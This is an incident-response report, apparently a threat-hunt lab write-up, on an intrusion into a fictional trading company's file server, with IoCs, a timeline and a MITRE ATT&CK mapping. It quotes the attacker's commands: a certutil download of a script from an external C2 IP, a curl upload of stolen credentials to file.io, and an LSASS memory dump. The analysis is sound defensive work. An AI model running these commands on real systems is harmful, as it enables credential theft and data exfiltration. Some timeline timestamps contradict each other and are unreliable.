<img width="740" height="1110" alt="image" src="https://github.com/user-attachments/assets/2fb944a4-843c-4169-8b62-f8996a89fcfe" />

# Threat-Hunt: Cargo Hold

# Index
- [Executive Summary](#executive-summary)
- [Technical Analysis](#technical-analysis)
- [Affected Systems & Data](#affected-systems--data)
- [Evidence Sources & Analysis](#evidence-sources--analysis)
- [Indicators of Compromise (IoCs)](#indicators-of-compromise-iocs)
- [Root Cause Analysis](#root-cause-analysis)
- [Technical Timeline](#technical-timeline)
- [Nature of the Attack](#nature-of-the-attack)
- [Impact Analysis](#impact-analysis)
- [Response and Recovery Analysis](#response-and-recovery-analysis)
- [Immediate Response Actions](#immediate-response-actions)
- [Eradication Measures](#eradication-measures)
- [Recovery Steps](#recovery-steps)
- [Post-Incident Actions](#post-incident-actions)
- [Annex A](#annex-a)
- [Technical Timeline](#technical-timeline-1)
- [MITRE ATT&CK Technique Mapping](#mitre-attck-technique-mapping--technical-timeline)

## Executive Summary
**Incident ID:** INC2025-0011-019
**Incident Severity:** Severity 1 (Critical) 
**Security Analyst** Albert Romero
**Incident Status:** Resolved

## Incident Overview:
- After establishing initial access on November 19th, network monitoring detected an unauthorized entity returning approximately 72 hours after at precisely `2025-11-22T00:27:58.4166424Z`. Suspicious lateral movement and large data transfers were observed overnight on the file server. Evidence of credential collection and exfiltration of data were followed by actions that align with persistence for continued privileges and anti-forensic attempts.

## Key Findings:
Due to a compromised device, the unauthorized entity performed lateral movement and discovered a critical server `azuki-fileserver01` through remote share enumeration. The threat actor then continued to probe for privilege and network enumeration. They then implemented a staging directory and began steps for defensive evasion by attempting to hide the staging directory path through obfuscation. Using legitimate system utilities with network capabilities, the unauthorized entity then weaponized "Living off the Land" techniques to download a script into the staging directory.<br>

The C2 IP address used to download the script `ex.ps1` was identified as `78.141.196.6` to the staging directory `C:\Windows\Logs\CBS\`. Credential file discovery was used for collection and created the file `IT-Admin-Passwords.csv` within the staging directory. The built-in system utility "xcopy.exe" was used in attempt to reduce the chance of detection of security alerts to stage data from the network share `"xcopy.exe" C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y`. The compression tool "tar.exe", which is not native to legacy Windows environments, then was utilized to archive collected data using the command `"tar.exe" -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .`. In order to avoid signature-base detection, the credential dumping tool was renamed to `pd.exe` and the process memory dump command `"pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp` performed the collection.<br>

Exfiltration steps were then initiated by `"curl.exe" -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io` which uses the cloud file sharing service file.io. Registry autorun keys were created for persistence with the registry value name `FileShareSync` which used the process `svchost.ps1` to masquerade the malicious files as legitimate Windows components to avoid suspicion. As an attempt at anti-forensics, the malicious actor then targeted the PowerShell command history `ConsoleHost_history.txt` for deletion.

## Immediate Actions:
- The SOC and DFIR teams exclusively managed the incident response procedures internally. Immediate action was taken to isolate the compromised systems from the network through the use of VLAN segmentation. To facilitate a comprehensive investigation, the SOC and DFIR teams gathered extensive data which included network traffic capture files. Additionally, all affected systems were plugged to a host security solution and all event logs were automatically collected by the existing SIEM.

## Stakeholder Impact:
### Customers:
- The credentials of IT accounts were exfiltrated and there is a potential that customer information may have been impacted as well. Impersonations of IT staff and the possibility of customer data being at risk are a possibility. Concerns with confidentiality of customer data is a priority and as a precautionary measure, some services were temporarily taken offline. The financial implications of this downtime are currently being assessed but could result in the loss of revenue and customer trust.

### Employees:
- The compromised device `azuki-fileserver01` housed sensitive employee information and has been identified as a major risk to employees. There has been a known remote accessed account `kenji.sato` that has been identified to have been compromised earlier and eventually led to this particular incident. The administrative account `fileadmin` has had indications of compromise and was utilized in this particular incident. The potential for identity theft, phishing attacks, and unauthorized access is critical.

### Business Partners:
- The fileserver affected by this incident has been known to hold information with business partners and company data. The unintended distribution of proprietary code or technology is concerning. There may be ramifications for business partners who rely on the integrity and exclusivity of Azuki Import/Export Trading CO., LTD.

### Regulatory Bodies:
- The breach of systems could have compliance implications. Regulatory bodies may impose fines or sanctions on Azuki Import/Export Trading CO., LTD for failing to adequately protect sensitive data. This ultimately falls on the jurisdiction and nature of the compromised data.

### Shareholders:
- This incident could have a short-term negative impact on stock prices due to the potential loss of customer trust and possible regulatory fines. Long-term effects will depend on the effectiveness of remedial actions taken and the company's ability to restore stakeholder confidence.

# Technical Analysis
## Affected Systems & Data
Due to insufficient network access controls, the unauthorized entity established initial access and waited (dwell time), before continuing operations. The threat actor successfully gained access over the following:

### Devices:
- `azuki-sl`
- `azuki-fileserver01`
### Accounts:
- `fileadmin`
- `kenji.sato`
  
## Evidence Sources & Analysis
After establishing initial access on November 19, 2025, network monitoring within the SOC detected the attacker returning approximately 72 hours later (`2025-11-22T00:27:58.4166424Z`). Suspicious lateral movement and large data transfers were observed overnight on the file server.

<img width="1168" height="304" alt="image" src="https://github.com/user-attachments/assets/bd9e8334-3d45-45f3-87eb-d2d452ae764d" />

The remote IP `159.26.106.98` made a successful logon to the device `azuki-sl` through the compromised account `kenji.sato` at `2025-11-22T00:27:58.4166424Z`. After this point, suspicious actions were taken and malicious intent were apparent.<br>

<img width="1968" height="498" alt="image" src="https://github.com/user-attachments/assets/ec2d9532-d6c5-46cf-b2e4-656478fc04dd" />

Lateral movement was observed across many devices which was sourced from a Remote Access Tool (RAT) with the process name `mstsc.exe`.

<img width="1781" height="553" alt="image" src="https://github.com/user-attachments/assets/74724b07-62a7-4bf4-a785-416eb6a43c1b" />

Queries for any remote sessions with successful logon attempts discovered suspicious activity involving the critical fileserver `azuki-fileserver01`.

<img width="1816" height="488" alt="image" src="https://github.com/user-attachments/assets/fcc5792a-a78c-44de-9fa7-00a9b9c77d53" />

Continual lateral movement was observed and reached an administrative account `fileadmin`. This account was then used for privilege escalation and enumeration tactics.

<img width="1756" height="543" alt="image" src="https://github.com/user-attachments/assets/237afb96-5af7-439a-a50a-8b92fa8077ea" />

At `2025-11-22T00:40:54.8271951Z`, the initial enumeration attempts were conducted using the `"net.exe" share` command. Proceeding this command, enumeration of remote shares were found to identify accessible file servers and data repositories across the network. This was executed by the command `"net.exe" view \\10.1.0.188` at `2025-11-22T00:42:01.9579347Z`.

<img width="1587" height="432" alt="image" src="https://github.com/user-attachments/assets/381aee74-2986-4a2c-960a-b84ff2c934fe" />

Privilege enumeration tactics continued with intent to determine what actions can be performed and whether privilege escalation is required.

<img width="1529" height="397" alt="image" src="https://github.com/user-attachments/assets/1bd58659-5f3f-463e-9eb0-53a083a512b3" />

Network configuration enumeration actions were performed in order to scope the environment, identify domain membership, and discover additional network segments.

<img width="1558" height="397" alt="image" src="https://github.com/user-attachments/assets/32e20007-5f59-46d0-b5ce-c22fd74fa1a0" />

Modifications to file system attributes were done with the intent to hide the staging directory from users and security tools. The staging path `C:\Windows\Logs\CBS` was created and modified to organize tools and stolen data before exfiltration. This directory path is directly linked to the IoC (Indicators of Compromise).

<img width="1877" height="538" alt="image" src="https://github.com/user-attachments/assets/c788caaf-38fd-4a27-8e2e-6eda6d9ddf54" />

The earliest signs of malicious command execution point to the unauthorized download of a suspicious script by using legitimate system utilities with network access.<br>

The PowerShell script `ex.ps1` was downloaded at using the command `"certutil.exe" -urlcache -f http://78.141.196.6:7331/ex.ps1` which also established the first contact of the C2 server `78.141.196.6`.<br>

From the logs, the PowerShell script `ex.ps1` was downloaded into the staging directory `C:\Windows\Logs\CBS\` through the IP address `78.141.196.6`. The script then triggered events that collected credentials, prepared the data for exfiltration, and exfiltrated the stolen data through a cloud service.<br>

<img width="1409" height="524" alt="image" src="https://github.com/user-attachments/assets/b59ab898-9cb3-4387-a55d-48f06d0fafed" />

Along with other potentially sensitive or private information, a credential file was created within the staging directory named `IT-Admin-Passwords.csv`. The naming convention may have suggested the intent to obtain credentials with administrative access.

<img width="1977" height="517" alt="image" src="https://github.com/user-attachments/assets/a956cee7-d900-4ed6-801a-baeb992e2a2a" />

Using built-in commands, in an attempt to lower the chances of triggering security alerts, the data was staged from a network share.

<img width="1838" height="491" alt="image" src="https://github.com/user-attachments/assets/db3dc076-d115-4175-a55d-d5d46e586394" />

Cross-platform compression tools were utilized to compress and prepare the staged data for collection.

<img width="1182" height="335" alt="image" src="https://github.com/user-attachments/assets/7e6d67df-9838-4aca-8e79-553c9d68cae5" />

The credential dumping tool was renamed to a less conspicuous filename as `pd.exe`.

<img width="1542" height="392" alt="image" src="https://github.com/user-attachments/assets/4cdeab92-9dfe-490b-be4e-89c7404f5bf4" />

Credentials were extracted using a process memory dump. The correlation between the previously identified tool `pd.exe`, and the critical security process `lsass`, suggests that the tool used the command `"pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp` to extract credentials into the staging directory.

<img width="1950" height="506" alt="image" src="https://github.com/user-attachments/assets/8bc85ab9-3341-4ce2-bb92-f45347318603" />

Exfiltration of data was confirmed through the usage of command-line HTTP clients that enabled scriptable data transfers. This command syntax can be added to the detection rules of the defender team. The evidence indicates that there were many transfers of varying file names which could potentially have sensitive stakeholder information.

<img width="1973" height="472" alt="image" src="https://github.com/user-attachments/assets/ff379502-3cc9-4687-a2e0-0971ff6cafba" />

A registry value name used to create persistence. Named `FileShareSync`, this registry value modification targeted a well-known autostart location. The malicious actor chose a value name designed to appear as legitimate software.

<img width="1897" height="485" alt="image" src="https://github.com/user-attachments/assets/fdb1b189-1ef3-4a13-b809-5bb06cdeaa45" />

Evidence of persistence was found in the form of an obfuscated PowerShell file `svchost.ps1`.

<img width="1380" height="402" alt="image" src="https://github.com/user-attachments/assets/a50b976e-ccda-4614-9f1a-2566a0fdf18b" />

Anti-forensic attempts were apparent by the deletion of the PowerShell history file `ConsoleHost_history.txt`. PowerShell saves command history to persistent files that survive session termination. Attackers target these files to cover their tracks.

## Indicators of Compromise (IoCs)
### C2 IP:
- 78.141.196.6
- ex.ps1 (SHA256):52749f37ff21af7fa72c2f6256df11740bb88b61eb5b6bf946d37a44a201435f

## Root Cause Analysis
Insufficient network access controls allowed the unauthorized entity access to Azuki Import/Export CO., LTD.'s internal network.<br>

The primary catalysts for the incident were traced back to Incident: "Port of Entry", which has identified the initial origin of the unauthorized access to an administrative account. Approximately 72 hours after the initial access, the unauthorized entity returned to the compromised account and began attempts at lateral movement. Vulnerabilities within identity access controls and network posture ultimately led to an increase in exposure. Internal threat detection and mitigation techniques such as Zero Trust and threat hunting may have prevented the initial attack vector. Inadequate network segregation of crucial systems also compounded the attack surface area.

# Technical Timeline
## Initial Compromise
November 22, 2025, `2025-11-22T00:27:58.4166424Z`: After establishing initial access, the unauthorized entity waited days (dwell time) before continuing their operations. The source IP address of the returning connection was `159.26.106.98`. Lateral movement began once the re-entry was established.

## Lateral Movement
November 22, 2025, `2025-11-19T19:10:49.2285576Z`: The threat actor then began to search for lateral movement targets based on their access to sensitive data or network privileges. The file server `azuki-fileserver01` was compromised along with the administrator account `fileadmin`.

## Data Access & Exfiltration
November 22, 2025, `2025-11-22T01:07:53.6430063Z`: Recursive copy commands were executed using built-in systems to stage data from a network share. This was most likely done in order to reduce the chances of triggering security alerts. At `2025-11-22T01:30:10.0981853Z`, the data was compressed using a cross-platform tool. Afterwards, at `2025-11-22T02:24:44.3906047Z`, the memory dump process for credential extraction began. The data was then exfiltrated using native windows utilities capable of making outbound HTTP requests with file payloads. Using a cloud file sharing service, the data was uploaded to the cloud service at `2025-11-22T01:59:54.2755596Z`.

## C2 Communications
November 22, 2025, `2025-11-22T00:56:47.4100711Z`: The C2 IP address was external and identified as: `78.141.196.6`.

## Malware Deployment or Activity
November 22, 2025, `2025-11-22T00:56:47.4100711Z`: Legitimate system utilities with network capabilities were weaponized to download malware to evade detection. The malware script `ex.ps1` was downloaded into the staging directory by using a legitimate Windows binary.

## Containment Times
- November 23, 2025, 02:30:10: Azuki Import/Export CO. LTD.'s SOC and DFIR teams detected the unauthorized activities and immediately isolated the devices and accounts from the network using VLAN segmentation.
- November 23, 2025, 02:50:56: Azuki Import/Export CO. LTD.'s SOC and DFIR teams began investigations and determined the scope of the attack of all affected systems.
- November 23, 2025, 07:30:56: Azuki Import/Export CO. LTD.'s SOC and DFIR teams updated firewall rules to block the known C2 IP address, effectively cutting off the unauthorized entity's remote access.

## Eradication Times
- November 23, 2025, 07:45:23: A specialized malware removal tool was used to scan and clean the affected systems. Remote Access Tools (RATs) were identified during the investigation and removed as well.
- November 23, 2025, 08:20:37: The login credentials of the affected accounts and all the potential credentials stolen were reset.

## Recovery Times
November 23, 2025, 09:14:48: After ensuring the affected devices were free of malware and remote access tools, the SOC team restored the system from a verified backup.

# Nature of the Attack
The modus operandi of the unauthorized entity used various tactics, techniques, and procedures they employed throughout their intrusion.

- Defense Evasion
The modification of file system attributes to hide the staging directory along with the use of legitimate system utilities show sophistication and intent to hide from detection. The malicious actor used these defense evasion techniques in an attempt to hide the download and execution of malware. Windows binaries were observed to have been abused as a "Living Off The Land" Bin (LOLBin), for retrieving remote payloads.
- OpSec and Persistence
Renaming of credential dumping tools occurred as basic OPSEC practice to evade signature-based detection. After exfiltration, the attacker showed intent to maintain their access through persistence by creating a registry value that executes on startup or user logon. In addition, a beacon file process masquerading as legitimate Windows components indicate their deceptive nature.

# Impact Analysis
In this segment, we should dive deeper into the initial stakeholder impact analysis presented at the outset of this report. Given the company's unique internal structure, business landscape, and regulatory obligations, it's crucial to offer a comprehensive evaluation of the incident's implications for every affected party.

# Response and Recovery Analysis
# Immediate Response Actions
## Revocation of Access
### Identification of Compromised Accounts / Systems:
Identification of Compromised Accounts / Systems: Using Microsoft Defender Advanced Hunting, suspicious activities associated with the intrusion were flagged on the following accounts and devices:
### Devices:
- `azuki-sl`
- `azuki-fileserver01`
### Accounts:
- `fileadmin`
- `kenji.sato`

### Timeframe:
Unauthorized activities were detected at `2025-11-22T00:27:58.4166424Z`. Access was terminated by November 23, 2025, 07:30:56 upon updating firewall rules that blocked the C2 IP address.

### Method of Revocation:
Alongside the firewall rules, Active Directory policies were applied to force log-off sessions from possibly compromised accounts. Additionally, affected user credentials were reset.

### Impact:
The immediate revocation of access halted potential lateral movement, preventing further system compromise and data exfiltration attempts.

## Containment Strategy
### Short-Term Containment:
As part of the initial response, VLAN segmentation was promptly applied, which effectively isolated the affected server and devices from the rest of the internal network. This hindered any further lateral movement by the threat actor.

### Long-Term Containment:
The next phase of containment involves a robust implementation of network segmentation, including specific departments or critical infrastructure run on isolated network segments, and stricter network access controls. This will ensure that only authorized devices have access to an organization's internal network, significantly reducing the attack surface for future threats.

### Effectiveness:
The containment strategies were successful in ensuring that the threat actor did not escalate privileges or move laterally to adjacent systems, ultimately limiting the incident's impact.

# Eradication Measures
## Malware Removal:
- Identification: Suspicious processes were flagged on the compromised systems, and the forensic examination revealed the download and execution of malware. Confirmations of persistence through a remote access tool were identified as well.
- Removal Techniques: Using a specialized malware removal tool, all identified malicious payloads, including the remote access tool, were eradicated from the affected systems.
- Verification: Post-removal, a secondary scan was initiated along with a heuristic analysis to ensure no remnants of the malware persisted.

## System Patching:
### Vulnerability Identification:
Multiple vulnerabilities with the current Role Based Access controls were identified, which lead to the initial compromise. The lateral movement of the initial compromised account allowed the threat actor to traverse the company's internal network share and target accounts for privilege escalation.

### Patch Management:
All systems and accounts were promptly updated with revisions to access controls. A more robust network segmentation of the company's servers and internal networks were implemented with a critical priority.

### Fallback Procedures:
System snapshots and configurations were backed up before patching. This will ensure a swift rollback if the update introduces any system instabilities.

# Recovery Steps
## Data Restoration
### Backup Validation:
Prior to data restoration, backup checksums were cross-verified to ensure the integrity of the backup data.

### Restoration Process:
The SOC team meticulously restored both affected systems from validated backups.

### Data Integrity Checks:
Post-restoration, cryptographic hashing using SHA-256 was employed to verify the integrity and authenticity of the restored data.

## System Validation
### Security Measures:
The systems' firewalls and intrusion detection systems were updated with the latest threat intelligence feeds, ensuring any indicators of compromise (IoCs) from this incident would trigger instant alerts.

### Operational Checks:
Before reintroducing systems into the live environment, a battery of operational tests, including load and stress testing, was conducted to confirm the systems' stability and performance.

# Post-Incident Actions
## Monitoring
### Enhanced Monitoring Plans:
The monitoring paradigm has been revamped to include behavioral analytics, focusing on spotting deviations from baseline behaviors which could indicate compromise. In addition, inventory and asset management activities commenced to facilitate the implementation of network access controls.

### Tools and Technologies:
Leveraging the capabilities of the existing Microsoft Defender, advanced correlation rules will be implemented, specifically designed to detect the tactics, techniques, and procedures (TTPs) identified in this breach.

## Lessons Learned
### Gap Analysis:
The incident shed light on certain gaps, primarily around network access controls, network segregation, and user training about potential phishing attempts with malicious documents.

### Recommendations for Improvement:
Initiatives around inventory and asset management, threat monitoring, and improved security awareness training are prioritized.

### Future Strategy:
A forward-looking strategy will involve more granular network access controls and network segmentation, adopting a zero-trust security model, and increasing investments in security awareness training.

# Annex A

# Technical Timeline
|              Time              |                                                              Activity                                                              |
|--------------------------------|------------------------------------------------------------------------------------------------------------------------------------|
| `2025-11-22T00:27:58.4166424Z` | Returning connection source `159.26.106.98` after dwell time of approximately 72 hours later of the initial compromise. The IP address was different from the original compromise. |
| `2025-11-19T19:10:49.2285576Z` | Lateral movement from the compromised device to the file server `azuki-fileserver01`. The DeviceProcessEvent `mstsc.exe`, which was known to be associated with the original compromise, correlated successful remote logins. |
| `2025-11-19T19:10:49.2662627Z` | Unauthorized access to the administrator account `fileadmin` was identified with an unknown LogonType. |
| `2025-11-22T00:40:54.8271951Z` | `"net.exe" share` command was executed in order to enumerate local network shares. Initial attempts at discovery began at this timeframe. |
| `2025-11-22T00:42:01.9579347Z` | `"net.exe" view \\10.1.0.188` command was executed to enumerate remote shares. |
| `2025-11-22T00:42:24.1217046Z` | Privilege enumeration techniques were implemented with a Windows native utility using the executable command: `"whoami.exe" /all`. |
| `2025-11-22T00:42:46.3655894Z` | Network configuration enumeration using a Windows native utility was executed using: `"ipconfig.exe" /all`. |
| `2025-11-22T00:55:43.9986049Z` | `"attrib.exe" +h +s C:\Windows\Logs\CBS` was executed in order to hide the staging directory. |
| `2025-11-22T00:55:43.9986049Z` | The staging directory path `C:\Windows\Logs\CBS` was created to organize tools and data for exfiltration. This directory path is critical for IoC. |
| `2025-11-22T00:56:47.4100711Z` | A PowerShell script was downloaded using a Windows binary. `*"certutil.exe" -urlcache -f http://78.141.196.6:7331/ex.ps1` was executed to download the malicious script from the C2 server. |
| `2025-11-22T01:07:53.6746323Z` | The file `IT-Admin-Passwords.csv` was created within the staging directory and indicated intent to harvest credentials by using a self-explanatory naming convention. |
| `2025-11-22T01:07:53.6430063Z` | Using a built-in system utility, the attacker replicated a network share's contents while preserving attributes and subdirectories using the command: `"xcopy.exe" C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y`. |
| `2025-11-22T01:30:10.0981853` | The command `"tar.exe" -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .` indicates utilization of a cross-platform compression tool to prepare the data in a portable format before exfiltration. |
| `2025-11-22T02:03:19.9845969Z` | The credential dumping tool was renamed to `pd.exe`. This is a basic OpSec practice in order to evade signature-based detection. |
| `2025-11-22T02:24:44.3906047Z` | The process memory dump command `"pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp` indicated the target of a critical security process (LSASS). This is critical evidence that shows exactly how credentials were extracted. |
| `2025-11-22T01:59:54.2755596Z` | In order to exfiltrate the data, a native Windows utility was used to upload the compressed archive to an external endpoint with the command: `"curl.exe" -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io` |
| `2025-11-22T01:59:54.2755596Z` | The cloud service `file.io` can be identified as the cloud file sharing service to exfiltrate the credentials. |
| `2025-11-22T02:10:50.7952326Z` | `FileShareSync`, a registry value name, was added and modified in order to appear as a legitimate boot or logon autostart execution software. This was done in order to establish persistence. |
| `2025-11-22T02:10:50.7952326Z` | The PowerShell script `svchost.ps1` was masqueraded as a legitimate Windows component to avoid suspicion. This script was identified as the persistence beacon. |
| `2025-11-22T02:26:01.1661095Z` | Anti-forensic techniques were implemented in order to avoid evidence collection. The PowerShell history file `ConsoleHost_history.txt` was deleted by the attacker. This file logs interactive PowerShell commands across sessions. |

## MITRE ATT&CK Technique Mapping – Technical Timeline

| Time (UTC) | Activity Summary | Tactic | Technique ID | Technique Name | Justification |
|------------|-----------------|--------|--------------|----------------|---------------|
| 2025-11-22 00:27 | Return connection after ~72h dwell time from new IP | Command and Control | T1071.001 | Application Layer Protocol: Web Protocols | Delayed callback behavior consistent with C2 beaconing over common web protocols |
| 2025-11-19 19:10 | RDP lateral movement using `mstsc.exe` | Lateral Movement | T1021.001 | Remote Services: RDP | Successful RDP logons from compromised host to file server |
| 2025-11-19 19:10 | Unauthorized access to administrator account `fileadmin` | Privilege Escalation / Credential Access | T1078 | Valid Accounts | Use of legitimate admin credentials with unknown logon type |
| 2025-11-22 00:40 | `net.exe share` enumeration | Discovery | T1135 | Network Share Discovery | Enumerated local SMB shares |
| 2025-11-22 00:42 | `net.exe view \\10.1.0.188` | Discovery | T1135 | Network Share Discovery | Enumerated remote network shares |
| 2025-11-22 00:42 | `whoami.exe /all` privilege enumeration | Discovery | T1033 | System Owner/User Discovery | Enumerated group memberships and privileges |
| 2025-11-22 00:42 | `ipconfig.exe /all` | Discovery | T1016 | System Network Configuration Discovery | Identified network interfaces and configuration |
| 2025-11-22 00:55 | `attrib.exe +h +s` used to hide directory | Defense Evasion | T1564.001 | Hide Artifacts: Hidden Files and Directories | Modified file attributes to conceal staging directory |
| 2025-11-22 00:55 | Creation of staging directory `C:\Windows\Logs\CBS` | Defense Evasion | T1074.001 | Data Staged: Local Data Staging | Organized data prior to exfiltration |
| 2025-11-22 00:56 | `certutil.exe` downloads PowerShell payload | Command and Control | T1105 | Ingress Tool Transfer | Living-off-the-land binary used to retrieve malicious script |
| 2025-11-22 01:07 | Creation of `IT-Admin-Passwords.csv` | Credential Access | T1555 | Credentials from Password Stores | File indicates harvested credentials collected for later use |
| 2025-11-22 01:07 | `xcopy.exe` replicates file share contents | Collection | T1039 | Data from Network Shared Drive | Collected sensitive data from network share |
| 2025-11-22 01:30 | `tar.exe` compresses credentials | Collection | T1560.001 | Archive Collected Data: Archive via Utility | Prepared data for exfiltration using native archiving |
| 2025-11-22 02:03 | Credential dumping tool renamed to `pd.exe` | Defense Evasion | T1036.005 | Masquerading: Match Legitimate Name | Renaming tool to evade signature-based detection |
| 2025-11-22 02:24 | LSASS memory dump (`lsass.dmp`) | Credential Access | T1003.001 | OS Credential Dumping: LSASS Memory | Direct dump of LSASS process memory |
| 2025-11-22 01:59 | `curl.exe` uploads archive to file.io | Exfiltration | T1567.002 | Exfiltration Over Web Services | Used legitimate cloud file-sharing service |
| 2025-11-22 01:59 | Use of cloud service file.io | Exfiltration | T1567 | Exfiltration Over Web Service | Data exfiltration via third-party service |
| 2025-11-22 02:10 | Registry autorun value `FileShareSync` added | Persistence | T1547.001 | Boot or Logon Autostart Execution: Registry Run Keys | Persistence via registry modification |
| 2025-11-22 02:10 | `svchost.ps1` masquerading | Defense Evasion | T1036.003 | Masquerading: Rename System Utilities | Script disguised as legitimate Windows component |
| 2025-11-22 02:26 | PowerShell history file deleted | Defense Evasion | T1070.003 | Indicator Removal on Host: Clear Command History | Anti-forensic activity to remove evidence |
